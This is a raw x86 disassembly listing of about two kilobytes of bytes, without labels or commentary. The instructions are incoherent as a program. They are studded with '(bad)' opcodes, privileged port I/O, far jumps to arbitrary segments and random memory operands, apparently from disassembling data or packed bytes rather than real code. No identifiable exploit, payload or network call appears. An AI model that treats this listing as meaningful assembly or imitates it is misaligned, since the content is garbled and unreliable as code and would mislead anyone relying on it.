  413316:	ret    0x372b
  413319:	test   al,0xf4
  41331b:	adc    bl,dl
  41331d:	push   edi
  41331e:	sbb    eax,DWORD PTR [eax]
  413320:	xlat   BYTE PTR ds:[ebx]
  413321:	jge    0x41335c
  413323:	scas   eax,DWORD PTR es:[edi]
  413324:	mov    BYTE PTR ds:0xab974d94,ah
  41332a:	mov    WORD PTR gs:[ebx-0x241ff1b4],ss
  413331:	imul   esp,DWORD PTR [esi+0x66],0xffffffad
  413335:	mov    DWORD PTR [ebx],edi
  413337:	dec    ecx
  413338:	pop    ecx
  413339:	pop    ecx
  41333a:	das    
  41333b:	lds    esi,FWORD PTR [edi]
  41333d:	es fwait
  41333f:	mov    ecx,0x576aa374
  413344:	fdiv   DWORD PTR [eax-0x5c]
  413347:	mov    bl,0xb3
  413349:	cmp    DWORD PTR [ebx+0x7584efac],ebp
  41334f:	out    0xb,al
  413351:	xchg   BYTE PTR [ecx+0x21],bl
  413354:	cdq    
  413355:	push   ss
  413356:	lods   al,BYTE PTR ds:[esi]
  413357:	mov    ah,0x0
  413359:	ror    DWORD PTR [ebx],cl
  41335b:	test   DWORD PTR [edi],ecx
  41335d:	test   eax,0x4de84130
  413362:	jp     0x413327
  413364:	jnp    0x41330c
  413366:	and    BYTE PTR gs:[edi+0x7239965f],0x5d
  41336e:	push   es
  41336f:	xchg   esi,eax
  413370:	dec    edi
  413371:	fiadd  DWORD PTR [edi+0x73afa12d]
  413377:	ins    DWORD PTR es:[edi],dx
  413378:	daa    
  413379:	inc    ecx
  41337a:	outs   dx,DWORD PTR ds:[esi]
  41337b:	out    0xe,al
  41337d:	or     eax,0x8812a2e8
  413382:	or     bh,bh
  413384:	fs out 0xaa,eax
  413387:	cli    
  413388:	cmp    BYTE PTR [esi],0xd3
  41338b:	cli    
  41338c:	push   esi
  41338d:	das    
  41338e:	popf   
  41338f:	pusha  
  413390:	mov    ah,0xae
  413392:	xor    al,BYTE PTR [ecx-0x4540c11a]
  413398:	mov    dh,0x39
  41339a:	(bad)  
  41339b:	xchg   edi,eax
  41339c:	in     eax,dx
  41339d:	jnp    0x4133b5
  41339f:	leave  
  4133a0:	adc    DWORD PTR [esi-0x52c6c7ad],ecx
  4133a6:	sbb    al,0x12
  4133a8:	inc    ebx
  4133a9:	scas   al,BYTE PTR es:[edi]
  4133aa:	mov    fs,eax
  4133ac:	mov    bl,0x27
  4133ae:	fdiv   QWORD PTR [edi+eax*2]
  4133b1:	shr    bh,1
  4133b3:	rol    BYTE PTR [ebx+0x1f],0xa7
  4133b7:	icebp  
  4133b8:	out    0xfd,eax
  4133ba:	(bad)  
  4133bb:	push   edi
  4133bc:	fsubp  st(4),st
  4133be:	mov    edi,0x11dc6b2b
  4133c3:	cdq    
  4133c4:	dec    esp
  4133c5:	dec    esp
  4133c6:	mov    al,ds:0xec61395e
  4133cb:	ret    
  4133cc:	cmp    eax,0x778f205e
  4133d1:	pop    ebp
  4133d2:	dec    ecx
  4133d3:	pop    esp
  4133d4:	clc    
  4133d5:	xchg   ebx,esp
  4133d7:	ret    0x2f1d
  4133da:	scas   eax,DWORD PTR es:[edi]
  4133db:	mov    edx,0xfb23142f
  4133e0:	xchg   ebx,eax
  4133e1:	(bad)  
  4133e2:	jo     0x41338a
  4133e4:	sbb    esp,esp
  4133e6:	xor    al,0x5e
  4133e8:	out    dx,al
  4133e9:	cwde   
  4133ea:	pop    ds
  4133eb:	xchg   edi,eax
  4133ec:	add    BYTE PTR [eax+0x3c],ch
  4133ef:	out    dx,eax
  4133f0:	pop    ecx
  4133f1:	jl     0x4133a4
  4133f3:	add    bl,BYTE PTR [esi+0x2e53ae6b]
  4133f9:	rcr    DWORD PTR [ebp+0x43],0x19
  4133fd:	sahf   
  4133fe:	out    0x15,eax
  413400:	jecxz  0x4133a4
  413402:	sar    DWORD PTR [edx],cl
  413404:	and    al,0x28
  413406:	fild   QWORD PTR [eax+0x7e]
  413409:	dec    ecx
  41340a:	push   esi
  41340b:	cs pushw es
  41340e:	cmp    DWORD PTR [eax+0x47],edx
  413411:	xchg   ebp,eax
  413412:	push   ecx
  413413:	xchg   BYTE PTR [ebp+0x17d35fdc],cl
  413419:	xchg   ebx,eax
  41341a:	ins    DWORD PTR es:[edi],dx
  41341b:	push   0x7942302f
  413420:	jbe    0x4133ef
  413422:	xchg   ecx,eax
  413423:	lock jne 0x41344a
  413426:	cmp    BYTE PTR [esi+ecx*2],bh
  413429:	dec    ebp
  41342a:	rcr    DWORD PTR [eax],1
  41342c:	xchg   edx,eax
  41342d:	mov    WORD PTR [edi+0x7ce77398],cs
  413433:	stos   BYTE PTR es:[edi],al
  413434:	nop
  413435:	ret    
  413436:	scas   eax,DWORD PTR es:[edi]
  413437:	std    
  413438:	inc    edx
  413439:	sahf   
  41343a:	pop    edi
  41343b:	pop    ecx
  41343c:	ret    0x1842
  41343f:	dec    ecx
  413440:	jne    0x41341a
  413442:	sub    eax,0x6e656bec
  413447:	loope  0x4133d8
  413449:	sub    DWORD PTR [edi],eax
  41344b:	dec    ebx
  41344c:	or     BYTE PTR [edi+0x11],dh
  41344f:	mov    bl,0x8c
  413451:	xchg   ecx,eax
  413452:	xlat   BYTE PTR ds:[ebx]
  413453:	fwait
  413454:	mov    WORD PTR [edi],?
  413456:	xchg   edi,eax
  413457:	xor    BYTE PTR ds:[ecx-0x4079d15e],dh
  41345e:	inc    ebp
  41345f:	xchg   BYTE PTR [esi],cl
  413461:	test   eax,0xef141dab
  413466:	mov    ah,0xbf
  413468:	psubusb mm0,QWORD PTR [edx+0x20]
  41346c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41346d:	cmp    BYTE PTR [ebx+eax*4],al
  413470:	cli    
  413471:	xchg   ebx,eax
  413472:	fwait
  413473:	push   ecx
  413474:	es (bad) 
  413476:	(bad)  
  413478:	sub    edi,edx
  41347a:	pop    esp
  41347b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41347c:	(bad)  
  41347d:	dec    esp
  41347e:	repz js 0x41347b
  413481:	cld    
  413482:	nop
  413483:	shl    BYTE PTR [edx],1
  413485:	sbb    DWORD PTR [edi],ecx
  413487:	xor    edi,DWORD PTR ds:0x96374d14
  41348d:	cs es add eax,0x38d7ea06
  413494:	lea    edx,[edi+eiz*2-0x30720667]
  41349b:	(bad)  
  41349c:	sbb    BYTE PTR [ebx-0x2b],bl
  41349f:	je     0x413515
  4134a1:	push   es
  4134a2:	or     al,0xe6
  4134a4:	or     al,0xe4
  4134a6:	jnp    0x41343e
  4134a8:	cmp    edx,esi
  4134aa:	mov    cl,0x74
  4134ac:	in     eax,0x7c
  4134ae:	(bad)  
  4134af:	fcmove st,st(7)
  4134b1:	xchg   eax,ecx
  4134b3:	ja     0x413454
  4134b5:	adc    DWORD PTR [edi],eax
  4134b7:	daa    
  4134b8:	test   BYTE PTR [ebx+0x48],0xbf
  4134bc:	and    DWORD PTR [edx],esi
  4134be:	ret    
  4134bf:	mov    bh,0x94
  4134c1:	push   ss
  4134c2:	sub    eax,0x4f7ba84f
  4134c7:	push   ds
  4134c8:	fcom   QWORD PTR [ecx]
  4134ca:	jl     0x413468
  4134cc:	and    al,0xd7
  4134ce:	hlt    
  4134cf:	cmp    BYTE PTR ds:0x4ec0e252,0xbf
  4134d6:	cdq    
  4134d7:	inc    edi
  4134d8:	mov    edx,0x8b5a4840
  4134dd:	dec    edx
  4134de:	call   0xbd732060
  4134e3:	xor    BYTE PTR [edi],0xef
  4134e6:	push   ebx
  4134e7:	enter  0x4e96,0xaf
  4134eb:	stos   DWORD PTR es:[edi],eax
  4134ec:	pop    edx
  4134ed:	test   eax,0x5c5ace8
  4134f2:	mov    cl,0x92
  4134f4:	fwait
  4134f5:	ja     0x413497
  4134f7:	xor    al,0xf2
  4134f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4134fa:	xchg   esi,eax
  4134fb:	jnp    0x4134ea
  4134fd:	mov    esi,0x2468299
  413502:	mov    ebp,esp
  413504:	leave  
  413505:	test   al,0xd8
  413507:	ins    DWORD PTR es:[edi],dx
  413508:	mov    ecx,0xbc112409
  41350d:	pop    ecx
  41350e:	ftst   
  413510:	xor    DWORD PTR [esi-0xe],ebp
  413513:	mov    bh,BYTE PTR [edi+0x6f]
  413516:	cs pop ss
  413518:	call   0x27c27b39
  41351d:	cmp    dl,BYTE PTR ds:0xa2b285d0
  413523:	adc    bl,BYTE PTR [ebp+eiz*2-0x2cc69156]
  41352a:	(bad)  
  41352b:	sti    
  41352c:	and    eax,0xb63bd763
  413531:	and    BYTE PTR [ecx-0x55768eb7],al
  413537:	mov    eax,0x94cba712
  41353c:	adc    eax,0xb65d76d7
  413541:	out    0x91,al
  413543:	aaa    
  413544:	xchg   edi,eax
  413545:	mov    eax,DWORD PTR [ebx]
  413547:	sbb    al,0xc8
  413549:	jae    0x413584
  41354b:	adc    BYTE PTR [ebx+edx*2],ah
  41354e:	sub    al,0x38
  413550:	sbb    al,0x2e
  413552:	(bad)  
  413553:	clc    
  413554:	push   edi
  413555:	sbb    al,0xb8
  413557:	out    0xbe,al
  413559:	cmp    BYTE PTR [edi-0x2a],dl
  41355c:	pop    ecx
  41355d:	adc    eax,0x29a356c7
  413562:	das    
  413563:	(bad)  
  413564:	dec    esp
  413565:	out    dx,al
  413566:	imul   esi,DWORD PTR [eax+0x23],0x75
  41356a:	int    0xc7
  41356c:	mov    ecx,0x88a0a4bc
  413571:	loope  0x413545
  413573:	popa   
  413574:	inc    ecx
  413575:	(bad)  
  413576:	into   
  413577:	dec    edx
  413578:	pushf  
  413579:	mov    edi,cs
  41357b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41357c:	loopne 0x4135fd
  41357e:	shl    DWORD PTR [edi-0xc6aae47],cl
  413584:	jg     0x41357c
  413586:	imul   esi,eax,0x5a
  413589:	pusha  
  41358a:	add    eax,0xcbe4817e
  41358f:	aaa    
  413590:	inc    ebx
  413591:	mov    bh,0x6d
  413593:	adc    ecx,DWORD PTR [ecx]
  413595:	dec    ebp
  413596:	and    dl,BYTE PTR [esi+eax*4-0x7fcd97f7]
  41359d:	push   ss
  41359e:	dec    edi
  41359f:	mov    DWORD PTR [edi-0xc],eax
  4135a2:	mov    eax,ds:0x82a30d78
  4135a7:	jne    0x413581
  4135a9:	cmp    al,0x37
  4135ab:	jne    0x41354b
  4135ad:	dec    esp
  4135ae:	out    0x39,al
  4135b0:	(bad)  
  4135b2:	aad    0x4a
  4135b4:	in     eax,dx
  4135b5:	cli    
  4135b6:	pop    esp
  4135b7:	pop    ecx
  4135b8:	ins    DWORD PTR es:[edi],dx
  4135b9:	fiadd  DWORD PTR [ebp-0x19]
  4135bc:	out    dx,eax
  4135bd:	xchg   edi,eax
  4135be:	ja     0x41362a
  4135c0:	pop    esi
  4135c1:	rcr    cl,cl
  4135c3:	jle    0x4135e6
  4135c5:	push   eax
  4135c6:	fbld   TBYTE PTR [esi+0x1712a0a6]
  4135cc:	loop   0x4135f1
  4135ce:	test   eax,0xe7757a78
  4135d3:	in     eax,0x80
  4135d5:	scas   al,BYTE PTR es:[edi]
  4135d6:	sbb    esi,DWORD PTR [ebx+ebx*2-0x7b]
  4135da:	lahf   
  4135db:	ins    BYTE PTR es:[edi],dx
  4135dc:	cmp    bl,BYTE PTR [eax-0x38]
  4135df:	call   0xc234:0xf3275877
  4135e6:	mov    ah,0x1c
  4135e8:	pushw  ss
  4135ea:	inc    edi
  4135eb:	mov    ah,BYTE PTR [ecx]
  4135ed:	inc    ebx
  4135ee:	clc    
  4135ef:	aaa    
  4135f0:	lea    ebp,[eax]
  4135f2:	add    eax,0xe81a83f2
  4135f7:	mov    ebp,0x1ef18890
  4135fc:	pop    esi
  4135fd:	mov    dh,0x59
  4135ff:	and    ecx,edi
  413601:	mov    bl,0x9d
  413603:	enter  0x2615,0x62
  413607:	sbb    al,0x12
  413609:	and    DWORD PTR [ecx+0x364aca23],eax
  41360f:	sub    al,0xca
  413611:	mov    edi,0xcb43d36c
  413616:	rcr    DWORD PTR [ecx-0x4b],1
  413619:	mov    edi,0x2b6e681b
  41361e:	cld    
  41361f:	std    
  413620:	xchg   ebp,eax
  413621:	rcl    bh,cl
  413623:	cmc    
  413624:	lds    edx,FWORD PTR [ebx]
  413626:	std    
  413627:	or     bh,BYTE PTR [ecx-0x6c225de8]
  41362d:	xlat   BYTE PTR ds:[ebx]
  41362e:	shl    DWORD PTR [ebx],0xd5
  413631:	sbb    BYTE PTR [ebx+0x3b],ah
  413634:	pop    edx
  413635:	or     DWORD PTR [ebp+0x4a],ebx
  413638:	lods   al,BYTE PTR cs:[esi]
  41363a:	std    
  41363b:	pop    edi
  41363c:	dec    ecx
  41363d:	add    DWORD PTR [esi+0x75d5cb8c],esi
  413643:	jl     0x413663
  413645:	push   esp
  413646:	test   al,0xc0
  413648:	jns    0x4135f5
  41364a:	xchg   ebp,eax
  41364b:	bound  eax,QWORD PTR [esi+ecx*8+0x6395abbc]
  413652:	xchg   edx,eax
  413653:	sub    esi,DWORD PTR [eax-0x3]
  413656:	fwait
  413657:	pop    ecx
  413658:	jno    0x4136d4
  41365a:	sub    al,BYTE PTR [ecx*1+0x783a68c7]
  413661:	sub    ebx,DWORD PTR [eax-0x6a]
  413664:	mov    ah,ch
  413666:	cmovno edi,DWORD PTR [edi+esi*4+0x63]
  41366b:	mov    ebp,0x4424e684
  413670:	ins    DWORD PTR es:[edi],dx
  413671:	xlat   BYTE PTR ds:[ebx]
  413672:	jae    0x4136ab
  413674:	xchg   DWORD PTR [ecx+0x3a],edx
  413677:	dec    esi
  413678:	aad    0xd3
  41367a:	jecxz  0x413613
  41367c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41367d:	aam    0xa6
  41367f:	shr    ecx,cl
  413681:	rcr    DWORD PTR [eax],1
  413683:	rcr    BYTE PTR [eax],cl
  413685:	jp     0x41361a
  413687:	fcomip st,st(5)
  413689:	push   esp
  41368a:	and    al,0x6d
  41368c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41368d:	mov    esi,0x9e24477c
  413692:	cmp    esi,DWORD PTR [ebp-0x12]
  413695:	fidiv  DWORD PTR ds:0xfa976e1
  41369b:	pusha  
  41369c:	and    dl,BYTE PTR [esi+0x77]
  41369f:	loope  0x41370c
  4136a1:	sub    edi,DWORD PTR [ebx-0x121c6ffb]
  4136a7:	js     0x4136f1
  4136a9:	push   esp
  4136aa:	dec    esi
  4136ab:	ins    DWORD PTR es:[edi],dx
  4136ac:	sti    
  4136ad:	retf   
  4136ae:	xchg   edx,eax
  4136af:	and    edi,ecx
  4136b1:	xor    BYTE PTR [ebx-0x51],ah
  4136b4:	sub    dl,BYTE PTR ds:0xa7e300cf
  4136ba:	hlt    
  4136bb:	stc    
  4136bc:	shl    BYTE PTR [ebx-0x1ec7ca50],cl
  4136c2:	das    
  4136c3:	push   es
  4136c4:	(bad)  
  4136c5:	or     al,0xc9
  4136c7:	mov    ebp,0x7ec572e5
  4136cc:	mov    al,0xa3
  4136ce:	inc    ecx
  4136cf:	fadd   st,st(2)
  4136d1:	inc    edx
  4136d2:	pop    eax
  4136d3:	imul   ebp,DWORD PTR [edi+0x47],0x281a1dbc
  4136da:	mov    ecx,0x58633854
  4136df:	mov    BYTE PTR [ebx-0x31],bh
  4136e2:	sbb    ecx,DWORD PTR [ecx-0x5e]
  4136e5:	mov    bh,bh
  4136e7:	sahf   
  4136e8:	lds    ecx,FWORD PTR [edx]
  4136ea:	and    bl,ah
  4136ec:	inc    edx
  4136ed:	data16 mov al,0x53
  4136f0:	imul   edi,DWORD PTR [ecx],0xffffffb4
  4136f3:	adc    eax,0xdbae4207
  4136f8:	data16 ja 0x4136b6
  4136fb:	cwde   
  4136fc:	dec    ebp
  4136fd:	mov    WORD PTR [ebx+0x2],?
  413700:	inc    esp
  413701:	test   bl,0x0
  413704:	aad    0x59
  413706:	xor    BYTE PTR [ebx-0x540d8ced],bl
  41370c:	lds    ebx,FWORD PTR [ecx+0x45]
  41370f:	fdiv   DWORD PTR [ecx]
  413711:	(bad)  
  413712:	pop    edi
  413713:	adc    dl,BYTE PTR [edi+edi*2]
  413716:	add    BYTE PTR [ebx+0x6f],dh
  413719:	mov    dl,0x5e
  41371b:	or     esi,DWORD PTR [edx+0x70c9632d]
  413721:	mov    BYTE PTR [esi-0xc],dl
  413724:	lods   eax,DWORD PTR ds:[esi]
  413725:	push   esp
  413726:	scas   al,BYTE PTR es:[edi]
  413727:	jmp    0x2d07:0x5ac18cc
  41372e:	jbe    0x4136bd
  413730:	pop    ss
  413731:	out    0xad,eax
  413733:	add    DWORD PTR [esi-0x59ecccc4],edx
  413739:	rol    DWORD PTR [edx],cl
  41373b:	retf   
  41373c:	lahf   
  41373d:	cdq    
  41373e:	add    bl,BYTE PTR [ebp+0xc0deb3b]
  413744:	ret    0x443d
  413747:	cmp    BYTE PTR [edi-0x404e241a],al
  41374d:	push   ss
  41374e:	jecxz  0x4137cd
  413750:	sub    edi,DWORD PTR [eax+0x4621f7d7]
  413756:	xchg   edi,eax
  413757:	xor    DWORD PTR [edi-0x3c64f560],ebp
  41375d:	jnp    0x413729
  41375f:	test   DWORD PTR [edi+0x3a123f93],edx
  413765:	lods   al,BYTE PTR ds:[esi]
  413766:	aaa    
  413767:	std    
  413768:	sbb    al,0xe7
  41376a:	loop   0x413732
  41376c:	inc    ebp
  41376d:	dec    esi
  41376e:	pop    edx
  41376f:	shr    BYTE PTR [esi],0xdc
  413772:	sbb    eax,0x77191aae
  413777:	jb     0x413791
  413779:	es jne 0x413758
  41377c:	dec    ebx
  41377d:	mov    cl,0x5f
  41377f:	inc    ebp
  413780:	ja     0x4137c6
  413782:	fucom  st(2)
  413784:	test   DWORD PTR [ecx],eax
  413786:	push   0x98d17dd8
  41378b:	mov    cl,0x41
  41378d:	push   edx
  41378e:	sbb    edx,esi
  413790:	(bad)  
  413791:	call   0x29ea:0x7ec5e113
  413798:	xor    DWORD PTR [esi+0x7b01d8e2],esp
  41379e:	pusha  
  41379f:	cli    
  4137a0:	mov    esp,0x8476f86d
  4137a5:	or     esi,DWORD PTR [edx]
  4137a7:	lods   al,BYTE PTR ds:[esi]
  4137a8:	push   es
  4137a9:	rcr    BYTE PTR [edx+0x282cc89f],0x22
  4137b0:	sbb    al,0xd
  4137b2:	mov    DWORD PTR [ecx],eax
  4137b4:	(bad)  
  4137b5:	mov    ecx,0xca077f49
  4137ba:	dec    ecx
  4137bb:	mov    BYTE PTR [eax],al
  4137bd:	cmp    DWORD PTR [ebx+0x712d7513],0x171ea87f
  4137c7:	push   ss
  4137c8:	bound  eax,QWORD PTR [ebx+0x64a9a8a6]
  4137ce:	aas    
  4137cf:	pop    edi
  4137d0:	mov    al,0xfa
  4137d2:	loop   0x413829
  4137d4:	enter  0x546a,0x49
  4137d8:	es mov ebp,0xd25d5ac8
  4137de:	stc    
  4137df:	mov    bh,0x1c
  4137e1:	jnp    0x413782
  4137e3:	xchg   esp,eax
  4137e4:	imul   BYTE PTR [esi+0xd9b28c1]
  4137ea:	setne  BYTE PTR [edi-0x4f]
  4137ee:	pop    esp
  4137ef:	xchg   ebx,eax
  4137f0:	add    eax,esp
  4137f2:	or     cl,BYTE PTR [edi+edx*4-0x7]
  4137f6:	push   eax
  4137f7:	les    ebx,FWORD PTR [esi]
  4137f9:	inc    eax
  4137fa:	int3   
  4137fb:	mov    dh,0x2b
  4137fd:	inc    esp
  4137fe:	mov    ch,dl
  413800:	ja     0x41387a
  413802:	aas    
  413803:	fwait
  413804:	push   es
  413805:	ror    esi,0x84
  413808:	pop    ecx
  413809:	lahf   
  41380a:	mov    ch,0x16
  41380c:	outs   dx,DWORD PTR ds:[esi]
  41380d:	in     eax,0xad
  41380f:	mov    bh,0x2
  413811:	xor    al,0x4
  413813:	in     al,0x7b
  413815:	stos   DWORD PTR es:[edi],eax
  413816:	xchg   BYTE PTR [edi-0x1e9add73],ch
  41381c:	jge    0x4137c8
  41381e:	jmp    0x1cd5:0x19aa02f3
  413825:	iret   
  413826:	les    esp,FWORD PTR [edx+0x70]
  413829:	fs xchg dl,ch
  41382c:	(bad)  
  41382d:	lods   eax,DWORD PTR ds:[esi]
  41382e:	xor    ebx,0xf399fc50
  413834:	mov    DWORD PTR [ebx],ecx
  413836:	push   esi
  413837:	and    BYTE PTR [edx],0xcc
  41383a:	inc    ecx
  41383b:	into   
  41383c:	fild   WORD PTR [edi+0x7fd56e8a]
  413842:	xor    DWORD PTR [esi],0xffffff8f
  413845:	mov    ecx,0x86e19dd8
  41384a:	mov    ah,0xa1
  41384c:	loopne 0x413872
  41384e:	push   eax
  41384f:	jns    0x4138be
  413851:	cmp    ecx,0x5e85149
  413857:	pop    ebx
  413858:	xchg   edi,eax
  413859:	push   ebx
  41385a:	dec    eax
  41385b:	arpl   WORD PTR [esi+0x5a8a5ee6],sp
  413861:	in     al,dx
  413862:	je     0x413800
  413864:	repz test DWORD PTR [ecx+0x60830f39],0x2a053fdb
  41386f:	sub    ch,0x4f
  413872:	sbb    edx,esi
  413874:	rol    DWORD PTR [esi+eax*4],cl
  413877:	sbb    DWORD PTR [esi-0x6cc97530],eax
  41387d:	jne    0x4138fb
  41387f:	dec    ebp
  413880:	pop    ebp
  413881:	adc    ebp,ebx
  413883:	pop    edx
  413884:	sub    al,0xf8
  413886:	rcr    BYTE PTR [esi+ebx*1],1
  413889:	add    eax,0x98750217
  41388e:	push   edi
  41388f:	loope  0x4138f7
  413891:	xchg   ebp,eax
  413892:	aaa    
  413893:	loopne 0x4138a1
  413895:	jb     0x4138ce
  413897:	lds    edi,FWORD PTR [ecx-0x4b89625]
  41389d:	jmp    0x4138f5
  41389f:	add    al,0x4d
  4138a1:	pop    edi
  4138a2:	fdivr  DWORD PTR [edi-0xc]
  4138a5:	aam    0x88
  4138a7:	sar    DWORD PTR [eax-0x18],cl
  4138aa:	call   0xe2f4fa5b
  4138af:	into   
  4138b0:	ror    DWORD PTR [esp+edx*4+0x20],0x16
  4138b5:	add    esi,eax
  4138b7:	mov    edx,0x7210fecf
  4138bc:	enter  0xe521,0x8e
  4138c0:	cli    
  4138c1:	jnp    0x4138d5
  4138c3:	jnp    0x4138c1
  4138c5:	xchg   esp,eax
  4138c6:	pop    esi
  4138c7:	mov    eax,0xdca737c0
  4138cc:	stc    
  4138cd:	test   al,0x9a
  4138cf:	sbb    ecx,DWORD PTR [esi]
  4138d1:	push   ebp
  4138d2:	jbe    0x413900
  4138d4:	stc    
  4138d5:	je     0x4138f6
  4138d7:	stc    
  4138d8:	btr    ebp,eax
  4138db:	cmp    edi,ecx
  4138dd:	fwait
  4138de:	neg    BYTE PTR ss:[esi+ebx*8-0x75c6f254]
  4138e6:	mov    ds:0x854854e8,al
  4138eb:	dec    eax
  4138ec:	int    0x3a
  4138ee:	in     al,dx
  4138ef:	retf   0xac64
  4138f2:	inc    esp
  4138f3:	sub    al,0x6e
  4138f5:	jae    0x4138a4
  4138f7:	xor    ecx,edi
  4138f9:	push   ds
  4138fa:	push   0xfc0d768a
  4138ff:	icebp  
  413900:	push   0x623fa28a
  413905:	cmp    ah,0x9c
  413908:	scas   eax,DWORD PTR es:[edi]
  413909:	sbb    cl,0xc6
  41390c:	adc    eax,DWORD PTR [ebx]
  41390e:	in     al,dx
  41390f:	cmp    eax,0x14224e4f
  413914:	push   cs
  413915:	xchg   ebp,eax
  413916:	xchg   ecx,eax
  413917:	int    0x23
  413919:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41391b:	dec    esi
  41391c:	pop    ss
  41391d:	lods   eax,DWORD PTR ds:[esi]
  41391e:	outs   dx,DWORD PTR ds:[esi]
  41391f:	popa   
  413920:	inc    ecx
  413921:	adc    eax,0xe279f32c
  413926:	inc    ebx
  413927:	imul   ebx,DWORD PTR [ebx+ebp*4+0x19],0x34
  41392c:	inc    ebp
  41392d:	cmp    esp,esi
  41392f:	add    esi,DWORD PTR [edi+0x67]
  413932:	add    eax,0x1cbf98b3
  413937:	gs in  al,0x54
  41393a:	imul   ebp,DWORD PTR [edi+0x2a3da0e6],0xc2fd32d0
  413944:	imul   ecx,DWORD PTR [eax+edx*2],0x506c2d57
  41394b:	sbb    al,0x2
  41394d:	push   ebx
  41394e:	repz cdq 
  413950:	sar    dl,cl
  413952:	pop    esp
  413953:	in     eax,dx
  413954:	cs je  0x413947
  413957:	sbb    BYTE PTR cs:[ecx+0x29],ah
  41395b:	(bad)  
  41395c:	xchg   esi,eax
  41395d:	push   esp
  41395e:	adc    eax,0x380b8d47
  413963:	pop    edi
  413964:	push   ds
  413965:	(bad)  
  413966:	adc    al,0x6e
  413968:	push   ebx
  413969:	sub    ecx,DWORD PTR [ecx-0x6c]
  41396c:	lods   al,BYTE PTR ds:[esi]
  41396d:	dec    esi
  41396e:	cmp    al,0xdb
  413970:	jge    0x413946
  413972:	or     BYTE PTR [edx+edx*1],0xc
  413976:	test   al,0x7f
  413978:	and    eax,0xffc871ee
  41397d:	enter  0x80e0,0xf3
  413981:	cs mov esp,0xe4d2a13f
  413987:	test   al,0x2c
  413989:	ss push ss
  41398b:	sub    eax,0xb39b4b61
  413990:	stc    
  413991:	lods   eax,DWORD PTR cs:[esi]
  413993:	dec    ebx
  413994:	fbstp  TBYTE PTR [edi-0x46]
  413997:	push   0xb6b24607
  41399c:	adc    eax,0xa672b2b9
  4139a1:	cmp    cl,dh
  4139a3:	mov    eax,ds:0x976533fb
  4139a8:	jb     0x4139dc
  4139aa:	adc    esp,DWORD PTR [esi]
  4139ac:	cs (bad) 
  4139af:	scas   al,BYTE PTR es:[edi]
  4139b0:	adc    eax,0xaa753c40
  4139b5:	xor    BYTE PTR [edx+0x52],0x19
  4139b9:	mov    ebp,0x5e87f7aa
  4139be:	adc    eax,0x7d629aa4
  4139c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4139c4:	test   ebp,ebp
  4139c6:	sbb    al,0xd9
  4139c8:	mov    dh,0xd6
  4139ca:	test   DWORD PTR [ebp*2-0x76ffe98e],ebp
  4139d1:	jbe    0x413a4e
  4139d3:	mov    edx,0x9442557c
  4139d8:	hlt    
  4139d9:	push   eax
  4139da:	sbb    DWORD PTR [ebp+0x31760cf1],esi
  4139e0:	imul   edx,DWORD PTR [edi],0xf914939d
  4139e6:	sub    al,0x15
  4139e8:	push   cs
  4139e9:	cld    
  4139ea:	shr    edx,1
  4139ec:	call   0x4a6e:0x6fdd3e58
  4139f3:	pop    edx
  4139f4:	dec    ecx
  4139f5:	mov    bh,BYTE PTR [edx+0x4b]
  4139f8:	(bad)  
  4139f9:	push   0x24104197
  4139fe:	ins    DWORD PTR es:[edi],dx
  4139ff:	ds jno 0x4139da
  413a02:	shl    BYTE PTR [eax-0x39],cl
  413a05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a06:	push   0x5a
  413a08:	or     BYTE PTR [edx+0x7101c66a],0x21
  413a0f:	aad    0x3
  413a11:	out    0x98,eax
  413a13:	stc    
  413a14:	pop    edi
  413a15:	mov    DWORD PTR [ecx+0x7a293192],0xa53c7dcd
  413a1f:	test   al,0xad
  413a21:	jl     0x4139aa
  413a23:	in     eax,dx
  413a24:	int    0xe
  413a26:	mov    bl,0xd2
  413a28:	outs   dx,BYTE PTR ds:[esi]
  413a29:	xor    eax,0x5fcd791a
  413a2e:	fisub  DWORD PTR [ecx-0x3110b573]
  413a34:	aaa    
  413a35:	add    DWORD PTR [ebp-0x51c3a63f],ebp
  413a3b:	and    bh,dh
  413a3d:	mov    ds:0x56ea7ea8,eax
  413a42:	das    
  413a43:	stos   BYTE PTR es:[edi],al
  413a44:	arpl   WORD PTR [edx],dx
  413a46:	and    BYTE PTR [ebx],bl
  413a48:	inc    ebx
  413a49:	dec    edi
  413a4a:	imul   edx,DWORD PTR [eax+0x22],0x1a8d4b15
  413a51:	push   cs
  413a52:	push   eax
  413a53:	imul   edi,DWORD PTR [edx+0x5c],0x7f342906
  413a5a:	push   esp
  413a5b:	xor    dl,BYTE PTR [ebx-0xb74842a]
  413a61:	xor    eax,0x60a70e78
  413a66:	mov    dl,0x8a
  413a68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a69:	pop    es
  413a6a:	loop   0x413a15
  413a6c:	xchg   ebx,eax
  413a6d:	pop    ecx
  413a6e:	sub    BYTE PTR [ebp+ebp*2-0x12215a87],al
  413a75:	add    bh,BYTE PTR ds:0x33b43951
  413a7b:	loopne 0x413a39
  413a7d:	jle    0x413ad9
  413a7f:	in     eax,dx
  413a80:	mov    ds:0xaf2acc1d,eax
  413a85:	neg    DWORD PTR [edx+0x7e5f15ef]
  413a8b:	les    edi,FWORD PTR [esi-0x2340f589]
  413a91:	sbb    al,0x7a
  413a93:	in     al,0x6a
  413a95:	cmp    cl,BYTE PTR ds:0xff27d3cb
  413a9b:	hlt    
  413a9c:	push   ss
  413a9d:	ds mov ebx,0xecc69a5f
  413aa3:	inc    ebx
  413aa4:	pop    ss
  413aa5:	jns    0x413b04
  413aa7:	ror    ch,cl
  413aa9:	fnsave [esi+0x6b]
  413aac:	es loope 0x413a69
  413aaf:	repnz adc dl,al
  413ab2:	aas    
  413ab3:	mov    ds:0x238f314d,al
  413ab8:	add    al,dh
  413aba:	and    DWORD PTR [esi+0x1931d2ee],edx
  413ac0:	jle    0x413af3
  413ac2:	jecxz  0x413a77
  413ac4:	sti    
  413ac5:	mov    eax,ds:0xc43b5bc3
  413aca:	cwde   
  413acb:	dec    ebx
  413acc:	imul   eax,DWORD PTR [edx+0x684f2bd6],0xfffffffe
  413ad3:	push   ebx
  413ad4:	jae    0x413b35
